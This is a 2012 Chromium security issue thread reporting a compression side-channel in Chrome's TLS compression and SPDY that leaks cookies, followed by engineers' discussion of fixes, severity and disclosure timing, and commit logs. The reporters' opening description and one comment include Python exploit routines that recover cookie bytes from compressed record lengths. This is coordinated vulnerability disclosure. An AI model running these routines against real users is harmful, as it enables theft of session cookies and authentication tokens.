# Security: SSL compression infoleak

| Field | Value |
|-------|-------|
| **Issue ID** | [40062088](https://issues.chromium.org/issues/40062088) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Internals, Internals>Network>SSL |
| **Reporter** | th...@gmail.com |
| **Assignee** | ag...@chromium.org |
| **Created** | 2012-07-31 |
| **Bounty** | $5,337.00 |

## Description

**VULNERABILITY DETAILS**

1. Introduction

It's a known vulnerablity that combining compression with encryption can sometimes reveal information that would not have been revealed without compression [1]. We've developed working exploits for this vulnerablity in Chrome's implementation of SSL/TLS compression. There are two attacks, both can reliably extract cookies just by:

\* using Javascript to create new <img> tags pointed to target domain  

\* looking at the lengths of the resulting SSL/TLS compressed records

It's worth noting that our attacks don't require any plugins; we use Javascript to make them faster, but it's possible to implement them even without any scripting capabilities.

2. First attack: Two Tries

Suppose that the cookie name is SID, and we want to obtain the first byte of its value, which is supposed to be the byte A. The first attack, which we call Two Tries, works as follows.

For each byte (guesschar) in the cookie's characterset, it constructs two URLs using this function:

GUESS\_LEN = 4  

WINDOW\_LEN = 2\*\*15 - 262 # zlib's default window size, see <http://www.zlib.net/zlib_tech.html>  

PAD\_BYTE = '&'  

REQ = " HTTP/1.1\r\nHost: localhost:8443\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.15 Safari/537.1\r\nAccept: \*/\*\r\nReferer: [https://localhost:8443/a.html\r\nAccept-Encoding](https://localhost:8443/a.html%5Cr%5CnAccept-Encoding): gzip,deflate,sdch\r\nAccept-Language: en-US,en;q=0.8\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,\*;q=0.3\r\nCookie: "

def two\_guess(known, guesschar):  

guess = known[-(GUESS\_LEN-1):] + guesschar # ID=x  

boundary = PAD\_BYTE \* GUESS\_LEN  

url1 = guess + boundary  

url2 = boundary + guess  

total\_pad = WINDOW\_LEN - len(REQ)- len(known) - 5 - 1 # 5 for "GET /", and 1 for the guesschar  

padding = PAD\_BYTE \* total\_pad  

url1 += padding  

url2 += padding  

return (url1, url2)

where known is "SID=". The trick here is to make sure that guess is out of zlib's window size in url1, but not so in url2. These two URLs are then used to open new cookie-bearing requests to target (e.g., setting them as image sources.) Here is our oracle:

\* When guess isn't equal to ID=A, compressed lengths of both requests would be the same.

\* When guess is equal to ID=A, compressed lengths of both requests would be different. This happens because the string "ID=A" in cookie would be replaced by a reference to the same string in the url2.

We found that this oracle is reliably enough to extract cookies.

2. Second attack: 16K-1

We found that if a request is larger than SSL's maximum record size (2^14 = 16K), Chrome would divide it into multiple records, and compress each of them in zlib's Z\_SYNC\_FLUSH mode. With this observation the second attack, which we call 16K-1, constructs URLs using the following function:

RECORD\_LEN = 2\*\*14  

def random\_url(known):  

url = random\_str(100)  

padding\_len = RECORD\_LEN - len(url) - len(REQ) - len(known) - 5 - 1 # 5 for "GET /", and 1 to make room for the first unknown byte  

url += padding\_len \* PAD\_BYTE  

assert len(url) == RECORD\_LEN - len(REQ) - len(known) - 5 - 1  

return url

The trick here is to generate a request larger than 2\*\*14, and make sure that its first record consists of:

\* 16K-1 known bytes, e.g., "GET /<random str><padding><boring request headers>"

\* 1 unknown cookie byte.

This URL is then used to obtain the next unknown cookie byte using this simple algorithm:

def compress(bytes):  

compressor = zlib.compressobj()  

return compressor.compress(bytes) + compressor.flush(zlib.Z\_SYNC\_FLUSH)

def next\_byte(cookie, known, alphabet=BASE64):  

good = alphabet  

while len(good) != 1:  

url = random\_url(known)  

record\_lens = query(url) # ask browser to send request, and sniff to obtain records' lengths  

length = record\_lens[0] # size of the first record  

record = "GET /%s%s%s" (url, REQ, known)  

for c in good:  

if len(compress(record + c)) != length:  

good.remove(c)  

return good[0]

This attack is 100% reliable.

3. Possible solutions

\* Randomize zlib's deflate(). You probably can't use random padding inside deflate(), because that would break servers, but you can still:

- add a random number of zlib's empty stored blocks
- use a randomized LZ77 algorithm with a random window size

This won't stop both attacks, just make them slower.

\* Compress-then-split the plaintext into SSL records rather than the current approach. We don't know if this would break any SSL servers, but this will stop the second attack.

[1] <http://tools.ietf.org/html/rfc3943#section-7>

## Timeline

### th...@gmail.com (2012-07-31)

I don't know how to add people to the CC list. Please help add my co-author jrizzo@gmail.com.

Thanks,

Thai.

### sc...@gmail.com (2012-07-31)

cc: Mr. Rizzo :)

### sc...@gmail.com (2012-07-31)

Presumably this is generic to libnss (e.g. Firefox). What about other SSL implementations?

cc:ing our various NSS / SSL / crypto guys.

### th...@gmail.com (2012-07-31)

On a side note: we also have working exploits against SPDY. We are going to file bug in a few hours.

I (thaidn) am working at Google, and plan to present demos of these attacks at my team (ISE)'s tomorrow meeting. If you are working at Google, let me know if you want to be invited to the meeting.

Thai.

### sc...@gmail.com (2012-07-31)

Re: filing a SPDY bug, it's probably only worth having one open bug for the general issue in the Chromium tracker? This could be it?

### th...@gmail.com (2012-07-31)

Chris: I haven't looked at other libraries yet. Chrome is the only browser that support client-side SSL compression. Anyway I think both of these attacks can still work against server-side's HTTP gzip over SSL. If an application echoes back some input from the attacker, then he can probably extract information (XSRF tokens, PII, etc.) from the responses. I haven't tried this idea in practice though.

Thai.

### th...@gmail.com (2012-07-31)

Re: filing a SPDY bug SSL compression and SPDY (with headers compression) over SSL are different. The SPDY bug actually looks like a protocol-level vulnerability, which I think should be addressed separately, and should involve SPDY's designers/implementers. Anyway it's your call.

### ag...@chromium.org (2012-07-31)

Let's keep it one bug for now. We can easily switch off TLS compression in Chrome. SPDY is tougher to change, but we're designing the SPDY/4 compression at the moment. I can loop in the right people tomorrow, when I'm awake.

### th...@gmail.com (2012-07-31)

In SPDY, the entire contents of the name/value header block including the URL and cookies is compressed using zlib deflate. So the first attack (Two Tries) described above should still work here.

We also found that SPDY uses a single zlib stream (context) for all name value pairs in one direction on a SPDY connection. This is understandably to get the most out of compression, i.e., this makes subsequent header blocks compress to very small outputs. So small that zlib decides to use fixed Huffman codes (see section 3.2.6 in [1],) which assign long code lengths to literals. This allows us to conduct an easier attack as follows:

def random_str(length):
    chars = BASE64
    return ''.join(random.choice(chars) for i in xrange(length))

def next_byte(known, alphabet=BASE64):
    # the first request is to "reset" the compression state so that 
    # subsequent requests would compress to fixed Huffman codes
    reset = known[-5:] + '?' 
    url = "/?%s%s" % (random_str(2), reset)
    query(url)
    # the second request is used to determine the length of requests with incorrect guess
    # '.' can be replaced with any chars not in the cookie's characterset
    incorrect = known[-5:] + '.'
    url = "/?%s%s" % (random_str(2), incorrect)
    length = query(url)

    good = alphabet
    while len(good) != 1:
        for c in good:
            guess = known[-5:] + c
            url = '/?%s%s' % (random_str(2), guess)
            i = query(url)
	   # if guess matches a substring of cookie, 
           # the length of the resulting request would be smaller than those don't match
            if i >= length:
                good.remove(c)
    return good[0]

This attack is 100% reliable, for both SPDY/2 and SPDY/3.

Note that all of these attacks described so far are not necessarily the best ones (in term of number of requests per byte for example.) We include them here because they are simple, hence easier to explain/understand. We have slightly more complicated algorithms that can make it down to a few requests per byte.

### th...@gmail.com (2012-07-31)

I forgot the include the reference of the SPDY writeup:

[1] http://www.ietf.org/rfc/rfc1951.txt

### ag...@chromium.org (2012-07-31)

Ok, we need a fix for generic TLS, which is easy: I'll just switch it off.

We need a fix for the new compression in SPDY/4: I'll tell flip-dev and run it by thaidn and jrizzo before it goes out.

Most problematically, we need a fix for SPDY/2 and SPDY/3. I don't think that a reasonable amount of padding is going to do much. Uniform random padding will slow the attacker down by, at most, 1/n for n bytes of padding as they have to watch for a minimum. I suspect a Student's t-test against normally distributed padding would be even more effective.

So I'm going to take a look at tweaking zlib to see whether sensitive data can be put into a separate compression domain.

### ag...@chromium.org (2012-07-31)

I have a patch to zlib which implements the ability to tag input as `alternative class' data vs `standard class' by default. Alternative data matches only against other alternative data and standard data matches only against standard data. Therefore, if we mark Cookie data as alternative, we can still compress against previous Cookie data, but it won't match any common substrings in the standard (attacker controlled data).

If we also SYNC_FLUSH when switching classes, that will stop the Huffman context from covering block standard and alternative class data in the same block.

Am I missing anything? Is there a better solution that I'm not thinking of?

### th...@gmail.com (2012-07-31)

Is it very easy for an attacker to inject cookies using XSS or cookie
forcing?

### ag...@chromium.org (2012-07-31)

(+cc some SPDY folks.)

### ag...@chromium.org (2012-07-31)

That's a fair point. For non-HSTS sites, the attacker could cookie force and inject their chosen plaintext that way.

I guess the easy solution is to simply store the cookies as a zlib literal block. But we do really want to deduplicate cookies across requests. How about when we compress cookies we only emit either literal data, or a back-reference to the same cookie (not a prefix)?

### ag...@chromium.org (2012-07-31)

[Empty comment from Monorail migration]

### ag...@chromium.org (2012-07-31)

[Empty comment from Monorail migration]

### ag...@chromium.org (2012-07-31)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-07-31)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-07-31)

[Empty comment from Monorail migration]

### th...@gmail.com (2012-07-31)

>I guess the easy solution is to simply store the cookies as a zlib literal block. But >we do really want to deduplicate cookies across requests. How about when we compress >cookies we only emit either literal data, or a back-reference to the same cookie (not >a prefix)?

Sorry, but I don't understand why this idea prevents chosen-plaintext by cookie forcing unless you want to treat each individual cookie separately.



### ag...@chromium.org (2012-07-31)

I'm proposing the following rules:

1. cookie data cannot compress against non-cookie data and vice versa. (This prevents the URL, Referer header etc from being used to query information about cookies. This includes using different Huffman blocks for each type of data.)

2. Each cookie has a NUL at the beginning and end so that no cookie is a prefix or suffix of another.

3. Each cookie either matches entirely, or is written as literals.

4. Each cookie has its own Huffman context.

So even if you cookie force, you can only tell whether you matched a previous cookie exactly. This does give you a cookie oracle, but you already had that because you can send a query to the server and see whether you have a valid cookie pretty easily.

The NUL rule prevents cookie XYZ from matching entirely against XYZPQR because it'll actually be '\0XYZ\0', which isn't a suffix or prefix of anything.

These rules don't affect the compression rate in a measurable way, although I'm still working to wedge the NUL rules in without breaking backwards compatibility.

We also have to worry about attacks where the server echos chosen-plaintext in the headers. This depends on the server vending sensitive Set-Cookie headers on demand and I'm not sure that they will, but we would need to check.

### jr...@gmail.com (2012-07-31)

Hello!

Increasing the minimun zlib match length would affect compression rate in a measurable way for HTTP requests?

### ag...@chromium.org (2012-07-31)

I could do some rough measurements of how increasing the minimum match affects compression rates, but I don't see how it helps unless we substantially increase it. The attacker can assume a lot of context prior to the first cookie: the string "cookie", the name and length of the cookie for SPDY etc.

### th...@gmail.com (2012-07-31)

Re https://crbug.com/chromium/139744#c24: Yes, you are right. I've seen a lot of cookies with known prefixes, some are even more than 16 bytes. Actually in the SPDY attack I use a 6-byte match.

Re https://crbug.com/chromium/139744#c22: While we don't know how you are going to implement this set of rules, we've discussed, and both of us don't see any ways to attack it.



### ds...@google.com (2012-08-01)

Summary of brief chat with AGL. 

Core assumption of the SPDY fix: (1) cookie is the only sensitive header we worry about being leaked via compression or (2) cookies are the only header unknown and sensitive part of the request that can be repeatedly injected into a request with high enough frequency to allow the relatively small compression window (16KB) to be exploited. 

Auth-type tokens in URLs or referrer headers come to mind as other possible sensitive items. Or are these already exposed via javascript?



The fix - that cookies are only stored exactly, never prefixed matched - suffices for this problem. 

On the server side, we are much less worried about this problem because set-cookie headers are not vended on demand, and even modest headers-only response are on the scale of a 100+ bytes, so a 16K compression context only gives you ~200 guests before a cookie gets flushed out of context. So unless you can get the server to vend the cookie on demand, hard to exploit. 

Note that SPDY proxy implementations are vulnerable here, because they will use a shared compression context across multiple origins, and it is easy for a choosen-plaintext attacker to have a cooperating origin do known value high frequency set-cookies to attempt to recover a cookie from another domain. 


### th...@google.com (2012-08-01)

Actually the window size that Chrome uses is 2**11 - 262 = 1768 bytes [1].

Cookie is not the only sensitive header that can be leaked. Authorization (basic auth, oauth2, etc.), Referer, XSRF headers, auth-type tokens in URLs, etc. can be leaked too. Say the victim loads Gmail on one of his tabs, and loads the attacker's Javascript on another tab, the attacker can always perform the following attack:

1. Wait till Gmail's Javascript client sends a secret-bearing request.

2. Perform his attacks to extract some part of the secret.

3. Come back to step 1 until he fully recovers the secret.

[1] http://src.chromium.org/svn/trunk/src/net/spdy/spdy_framer.cc

### th...@google.com (2012-08-01)

In case it isn't clear, what I meant is even if the attacker can't make secret-bearing requests himself (i.e., the secret is a XSRF token or a OAuth2 header), he just needs to wait till the client side of the target application makes such a request. The small window size would prevent him from fully recovering the secret in one try, but he can just repeat the aforementioned process. This attack is application-dependent, but it should work for most applications.

The main problem is that all requests to target.com, regardless of where they are from, are compressed with the same compressor.

### [Deleted User] (2012-08-01)

[Empty comment from Monorail migration]

### [Deleted User] (2012-08-01)

[Empty comment from Monorail migration]

### ja...@chromium.org (2012-08-01)

You might consider distinguishing secure vs non-secure cookies.  Non-secure cookies can be easily injected by a fake server via HTTP.  In addition, non-secure cookies can be observed over a non-SSL connection, so there is probably no need to be concerned about disclosing them (via such attacks).

To get reasonable compression in the face of some of these attacks <sigh>, it might be especially helpful to sort our header blocks with a primary key that distinguishes between the confidential class of headers (e.g., secure-cookies, auth, etc.), vs low security headers.  That might give a bit of a chance for the low security stuff to compress well, even across header lines, assuming there was a secondary sort key that kept 'em in a nice order.

re: https://crbug.com/chromium/139744#c22
I really liked the "each cookie [high security item?] matches entirely, or is written as a literal."  Given that policy, I didn't see why you needed to mess with nulls, and the beauty of your approach is it transparently decodes (i.e., you picked a sub-optimal compression string... but that is allowed).  Were the nulls meant to just be API marker sentinels (to help identify on/off points), but not be effectively encoded and transmitted??

The "separate huffman compression context for each cookie" had me confused.  Were you suggesting that *each* cookie had a different context?  ...or that all cookies had a context distinct from non-cookies?   In either case, I was having a hard time seeing how this would transparently fly with existing decoders :-/.  It would possibly be nice if we had a different protocol which allowed us to turn on/off the Huffman phase.  Can you talk a bit more about how you were contemplating to achieve this element?


### ja...@chromium.org (2012-08-01)

re: Huffman phase

Interesting (though I'm not sure how viable) way to effectively avoid leaking via Huffman state.

Assuming cookie like data was transmitted as literals, it *might* be possible to construct a compensating "fake header, coded via literals in the LZ phase" that comes close to undoing the Huffman compressor state change that is induced by the cookies.  There is of course a nauseating fear that we'd send so many bytes, that we counteract the compression <sigh>, but at least this *could* be done so as to be relatively compatible with any existing decompressor (it just adds some funky injected X-header values). 

It is probably a bit tricky... but I think the key point is that Huffman coding focuses on probability of symbols, and *not* on their sequencing.  I tried to read about zip... and I'm not sure... but I *think* it is doing byte symbol coding (not byte-pairs, or larger).   As a result, something like listing the characters that are not sent in a literal-cookie section, you *might* get close to negating the impact of the cookies on the Huffman state.  

To be more specific (with a wasteful proof of concept), we could probably tally how many times each character was seen in the cookie-literal section; and see what character was sent the most; and then send other characters enough times to even things out :-/.  That is certainly not perfect, as this is really adaptive Huffman coding <sigh>, so it is (at first blush) probably harder to negate the impact on the coding tree.... but I bet you could get close... and that would probably result in a significant dent (if not elimination) of the leak rate (via Huffman state).  If we looked closer at the Huffman tree we could (being less wasteful) probably drive the state of the Huffman coder back to what it used to be, and not send *that* many extra character <fingers crossed... we could look... and I'm not clear on how close we need to get to perfect>.

### ag...@chromium.org (2012-08-01)

There's a snapshot of what I currently have at https://chromiumcodereview.appspot.com/10837057/, although non-Chromium folks might not be able to see it. (It's certainly not ready, but I'll be heading home for the day in a bit.)

The rules that it implements are similar to #22, except that I read the SPDY spec wrong and previously thought that NUL bytes were used to separate Cookie values. SPDY actually mirrors HTTP and uses semicolons, so the semicolon is now the magic byte that's used to ensure that we don't match a prefix or suffix of a cookie.

In addition, only whitelisted headers are compressed against other non-cookie, header content (and the dictionary). The values of non-whitelisted headers are compressed in isolation with just Huffman encoding.

My compression test involves loading Gmail and looking at the value of SpdySynStreamCompressionPercentage. Based on that, we don't have much impact on compression rates.

Some cookies are longer than MAX_MATCH and so will never be matched. We also miss a lot of cookies because of the small window, at least with Gmail, but we would likely have missed them previously too, although we might have gotten the tail end of them.

The whitelisted headers are:

  773     } else if (it->first == "accept" ||
  774                it->first == "accept-charset" ||
  775                it->first == "accept-encoding" ||
  776                it->first == "accept-language" ||
  777                it->first == "host" ||
  778                it->first == "version" ||
  779                it->first == "method" ||
  780                it->first == "scheme" ||
  781                it->first == ":host" ||
  782                it->first == ":version" ||
  783                it->first == ":method" ||
  784                it->first == ":scheme" ||
  785                it->first == "user-agent") {

### ag...@chromium.org (2012-08-01)

(in reply to jar's #31:)

We don't get to see secure/non-secure at the SPDY layer. I fear the amount of plumbing involved in getting that information would be prohibitive.

The NULs (which are now semicolons) are intended to stop matches of a prefix or suffix of a previous cookie. Let's say that the attacker is interested in the cookie `SID=commonprefix=bar'. They could set a cookie `commonprefix=b' and that would match in it's entirety inside of the interesting cookie. Then they can iterate to find the next byte by watching for the minimal length of  `commonprefix=ba', `commonprefix=bb' etc.

By requiring a semicolon at the end, they get `commonprefix=ba;', which cannot be a substring of any other cookie, except that it could be a suffix. So we also require that the match be preceeded by either a semicolon, or non-cookie data.

I'm setting a different Huffman context for *each* cookie value. This works because DEFLATE streams are a series of blocks. A block has its own Huffman context. We we start a new block for each cookie value.

### ag...@chromium.org (2012-08-01)

And, for the `doh!' value, Brian Smith just pointed out that I described this attack last year but never had the time to follow up:  https://groups.google.com/forum/#!msg/spdy-dev/B_ulCnBjSug/rcU-SIFtTKoJ

### ds...@google.com (2012-08-02)

I think line 790 in the spdy frame diff should be 

WriteZ(it->second, kZCookieData, z)

right, so the non-whitelisted headers are treated the same as cookies, right?


### ag...@chromium.org (2012-08-02)

dstodolsky: yes, thanks! It should actually be kZHuffmanOnly because it's not actually cookie data.

In order to check that the code is actually doing what I think it should be, I wrote some visulisations. (Note: these are large and will take a while for your browser to chew over)

http://www/~agl/z3.html

This is after patching. Black text comes from a back reference and is underlined. The underline is light blue if the reference is from the pre-shared dictionary, otherwise it's blue for references from the data. The gray lines show were the previous copy of the text was. Empty circles are the start of fixed-table Huffman blocks and filled circles are the start of dynamic table Huffman blocks.

We can see that each cookie has it's own Huffman block. (And note that I've replaced the sensitive cookies with X's, at least I hope they are the sensitive ones.) We can also see that the non-whitelisted header data (i.e. ':path') is in it's own Huffman block and didn't substring match against the previous data at all.

In the second request we see that the cookies that are replaced with back references are replaced completely or not at all.

As we go down, we don't get a lot of compression because all the cookie data has blown out the window: a single request is so large that we're flushing the window every time.


Here's roughly the same requests under the previous scheme:

We see better compression initially because the cookies that are longer than MAX_MATCH, can still be matched in several pieces. We also see things like ':path' matching against the hostname. As we go down, the window is again blown out by the size of the requests. But we do get significant amounts of matching *within* cookies. Notably in the GMAIL_IMPL cookie.

We could imagine allowing cookies to match within themselves in the new scheme too. But I don't think it's worth the complexity. Hopefully most cookies take more care than GMAIL_IMPL not to waste space.

### ag...@chromium.org (2012-08-02)

(sorry, I forgot the link to the diagram for the previous scheme in #37. It's http://www/~agl/z4.html)

### ag...@chromium.org (2012-08-02)

And, out of interest, http://www/~agl/z5.html is the next scheme with an increased window and http://www/~agl/z6.html is the old scheme, also with the larger window.

z6 is compressing fantastically well, showing that our window is clearly too small at the moment. (None the less, I'm not going to change it now.) The parts of z5 which aren't compressed are now the non-whitelisted headers and the cookies that are larger than MAX_MATCH.

### bu...@chromium.org (2012-08-02)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=149672

------------------------------------------------------------------------
r149672 | agl@chromium.org | 2012-08-02T19:25:45.871851Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/browser/page_info_model.cc?r1=149672&r2=149671&pathrev=149672
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/socket/ssl_client_socket_nss.cc?r1=149672&r2=149671&pathrev=149672

net: disable SSL compression

This change also updates the page-info dialog to assume that compression isn't
used. It doesn't, however, remove the message from the .grd file in order to
make this change easier to merge.

BUG=139744

Review URL: https://chromiumcodereview.appspot.com/10823111
------------------------------------------------------------------------

### ag...@chromium.org (2012-08-03)

[Empty comment from Monorail migration]

### ag...@chromium.org (2012-08-03)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-08-03)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=149947

------------------------------------------------------------------------
r149947 | agl@chromium.org | 2012-08-03T22:35:13.327486Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/socket/ssl_client_socket_openssl.cc?r1=149947&r2=149946&pathrev=149947

net: disable TLS compression with OpenSSL.

BUG=139744


Review URL: https://chromiumcodereview.appspot.com/10825183
------------------------------------------------------------------------

### [Deleted User] (2012-08-03)

On SPDY/4.

SPDY/4 as spec'ed out right now is vulnerable to this style of attack IFF the attacker can cause a prepend to the cookie. Everything after the prepended data would be emitted and possibly compressed by gzip again. Since the attacker can probably cause this to happen, it must be addressed.

There are three obvious things we can do.
1) separate gzip contexts for various segmentation of header lines (if the two contexts were 'sensitive' and 'not sensitive', this would essentially be Adam's approach). Doing compression line-by-line would obviate the need to figure out if data in the header is sensitive or not (which could be problematic for things like WebSocket in the future).

2) separate all cookie fragments out into their own storage, e.g. allow for not just key-val storage, but key-val* storage. This would be useful for any header which is composed of multiple parts and changing often.

3) Add an 'insert' and/or 'overwrite' operation so that only the parts of data which have actually changed are emitted and thus probable. If this can be done efficiently, it is probably the safest.

I'm investigating how difficult #3 is to do right now.

### js...@chromium.org (2012-08-05)

Active MitM can steal cookies. Sounds like the higher end of medium-severity.

### th...@gmail.com (2012-08-05)

Re https://crbug.com/chromium/139744#c45: No, it isn't active MitM. A passive sniffer can always extract bytes from your cookies.

### in...@chromium.org (2012-08-05)

[Empty comment from Monorail migration]

### js...@chromium.org (2012-08-05)

Yes, the sniffing is passive, but you need to pair it with JavaScript running on the client (which is active). This isn't to say the attack is not clever or technically interesting (it certainly is). This is just to quantify it in our severity scale.

### th...@gmail.com (2012-08-05)

You dont need active Javascript. A big static HTML file with a lot of img
tags might be enough.

It probably depends on whom you ask, but I dont call these attacks "man in
the middle", because there is no impersonation on either side of the
connection.

### js...@chromium.org (2012-08-06)

That's still an active attack. A passive attack means you don't need to manipulate the client; you just monitor the activity.

### th...@gmail.com (2012-08-06)

> A passive attack means you don't need to manipulate the client; you just monitor the activity.

Maybe... next time :-).

Anyway, thanks for the clarification. While I still disagree, but it's clear now why you classify it this way.

Cheers.

### ag...@chromium.org (2012-08-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-08-14)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=151502

------------------------------------------------------------------------
r151502 | agl@chromium.org | 2012-08-14T17:31:21.251487Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/spdy/buffered_spdy_framer.cc?r1=151502&r2=151501&pathrev=151502
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/spdy/spdy_framer.h?r1=151502&r2=151501&pathrev=151502
   M http://src.chromium.org/viewvc/chrome/trunk/src/third_party/zlib/zlib.gyp?r1=151502&r2=151501&pathrev=151502
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/spdy/buffered_spdy_framer.h?r1=151502&r2=151501&pathrev=151502
   M http://src.chromium.org/viewvc/chrome/trunk/src/third_party/zlib/README.chromium?r1=151502&r2=151501&pathrev=151502
   A http://src.chromium.org/viewvc/chrome/trunk/src/third_party/zlib/mixed-source.patch?r1=151502&r2=151501&pathrev=151502
   M http://src.chromium.org/viewvc/chrome/trunk/src/third_party/zlib/deflate.c?r1=151502&r2=151501&pathrev=151502
   M http://src.chromium.org/viewvc/chrome/trunk/src/third_party/zlib/zlib.h?r1=151502&r2=151501&pathrev=151502
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/spdy/spdy_framer_test.cc?r1=151502&r2=151501&pathrev=151502
   M http://src.chromium.org/viewvc/chrome/trunk/src/third_party/zlib/deflate.h?r1=151502&r2=151501&pathrev=151502
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/spdy/spdy_framer.cc?r1=151502&r2=151501&pathrev=151502

net: workaround compression leaks

BUG=139744

Review URL: https://chromiumcodereview.appspot.com/10837057
------------------------------------------------------------------------

### jr...@gmail.com (2012-08-15)

What is the estimated release date for the patched version?

### ag...@chromium.org (2012-08-15)

The patch got reverted due to issues with the packaging on the official builder. Hopefully we can get it into M22 next month.

### bu...@chromium.org (2012-08-15)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=151720

------------------------------------------------------------------------
r151720 | agl@chromium.org | 2012-08-15T19:00:00.199117Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/spdy/buffered_spdy_framer.cc?r1=151720&r2=151719&pathrev=151720
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/spdy/spdy_framer.h?r1=151720&r2=151719&pathrev=151720
   M http://src.chromium.org/viewvc/chrome/trunk/src/third_party/zlib/zlib.gyp?r1=151720&r2=151719&pathrev=151720
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/spdy/buffered_spdy_framer.h?r1=151720&r2=151719&pathrev=151720
   M http://src.chromium.org/viewvc/chrome/trunk/src/third_party/zlib/README.chromium?r1=151720&r2=151719&pathrev=151720
   A http://src.chromium.org/viewvc/chrome/trunk/src/third_party/zlib/mixed-source.patch?r1=151720&r2=151719&pathrev=151720
   M http://src.chromium.org/viewvc/chrome/trunk/src/third_party/zlib/deflate.c?r1=151720&r2=151719&pathrev=151720
   M http://src.chromium.org/viewvc/chrome/trunk/src/third_party/zlib/zlib.h?r1=151720&r2=151719&pathrev=151720
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/spdy/spdy_framer_test.cc?r1=151720&r2=151719&pathrev=151720
   M http://src.chromium.org/viewvc/chrome/trunk/src/third_party/zlib/deflate.h?r1=151720&r2=151719&pathrev=151720
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/spdy/spdy_framer.cc?r1=151720&r2=151719&pathrev=151720

net: workaround compression leaks

(This is a reland of r151502, which was reverted in r151517 because it
broke the Linux Official build.)

This may break the Official build for a brief window while a two-sided
patch lands.

BUG=139744

Review URL: https://chromiumcodereview.appspot.com/10837057
------------------------------------------------------------------------

### in...@chromium.org (2012-08-16)

Looks like the patch landed 21 hours ago :)? Is there anything else pending here other than the merge ?

### jr...@gmail.com (2012-08-17)

I plan to present this research at Ekoparty 2012, September 20 or 21. I'll also contact other vendors earlier if I find any other product to be potentially vulnerable.

### ag...@chromium.org (2012-08-24)

(Will merge once Chris figures out whether we want to merge to 22 or 21+22.)

### pa...@google.com (2012-08-24)

jschuh and I think that merging it into just 22 is ok, but cevans should make the final call. CCing him explicitly.

### sc...@gmail.com (2012-08-24)

If we merge to only M22, then the details will be revealed at EkoParty before we've pushed the fix to stable. Although it's unlikely anything bad will come from that, it doesn't seem up to our usual (admittedly high) standards.

### ag...@chromium.org (2012-08-24)

I think that was a subtle way of telling me that I need to merge to M21 too :) I'll try that on Monday. It's going to be a nasty merge because the src-internals DEPS need to be updated for the Linux builder.

### sc...@gmail.com (2012-08-24)

Well, I think we should debate more since I'm in the minority ;-)

### jr...@gmail.com (2012-08-24)

The patched code is already public and the possibility of this attack has been discussed in the past. However, the presentation demos will show how practical the attack is and could motivate people to implement it. If you decide to avoid merging to M21, I can delay the release of PoC code a few weeks until M22 is released.

### bu...@chromium.org (2012-08-27)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=153496

------------------------------------------------------------------------
r153496 | agl@chromium.org | 2012-08-27T17:09:14.306647Z

Changed paths:
   A http://src.chromium.org/viewvc/chrome/branches/1180/src/third_party/zlib/mixed-source.patch?r1=153496&r2=153495&pathrev=153496
   M http://src.chromium.org/viewvc/chrome/branches/1180/src/third_party/zlib/deflate.c?r1=153496&r2=153495&pathrev=153496
   M http://src.chromium.org/viewvc/chrome/branches/1180/src/third_party/zlib/zlib.h?r1=153496&r2=153495&pathrev=153496
   M http://src.chromium.org/viewvc/chrome/branches/1180/src/net/spdy/spdy_framer_test.cc?r1=153496&r2=153495&pathrev=153496
   M http://src.chromium.org/viewvc/chrome/branches/1180/src/third_party/zlib/deflate.h?r1=153496&r2=153495&pathrev=153496
   M http://src.chromium.org/viewvc/chrome/branches/1180/src/net/spdy/spdy_framer.cc?r1=153496&r2=153495&pathrev=153496
   M http://src.chromium.org/viewvc/chrome/branches/1180/src/net/spdy/buffered_spdy_framer.cc?r1=153496&r2=153495&pathrev=153496
   M http://src.chromium.org/viewvc/chrome/branches/1180/src/net/spdy/spdy_framer.h?r1=153496&r2=153495&pathrev=153496
   M http://src.chromium.org/viewvc/chrome/branches/1180/src/third_party/zlib/zlib.gyp?r1=153496&r2=153495&pathrev=153496
   M http://src.chromium.org/viewvc/chrome/branches/1180/src/net/spdy/buffered_spdy_framer.h?r1=153496&r2=153495&pathrev=153496
   M http://src.chromium.org/viewvc/chrome/branches/1180/src/third_party/zlib/README.chromium?r1=153496&r2=153495&pathrev=153496

Merge 151720 - net: workaround compression leaks

(This is a reland of r151502, which was reverted in r151517 because it
broke the Linux Official build.)

This may break the Official build for a brief window while a two-sided
patch lands.

BUG=139744

Review URL: https://chromiumcodereview.appspot.com/10837057

TBR=agl@chromium.org
Review URL: https://chromiumcodereview.appspot.com/10874087
------------------------------------------------------------------------

### bu...@chromium.org (2012-08-28)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=153595

------------------------------------------------------------------------
r153595 | agl@chromium.org | 2012-08-28T00:35:09.165522Z

Changed paths:
   D http://src.chromium.org/viewvc/chrome/branches/1180/src/third_party/zlib/mixed-source.patch?r1=153595&r2=153594&pathrev=153595
   M http://src.chromium.org/viewvc/chrome/branches/1180/src/third_party/zlib/deflate.c?r1=153595&r2=153594&pathrev=153595
   M http://src.chromium.org/viewvc/chrome/branches/1180/src/third_party/zlib/zlib.h?r1=153595&r2=153594&pathrev=153595
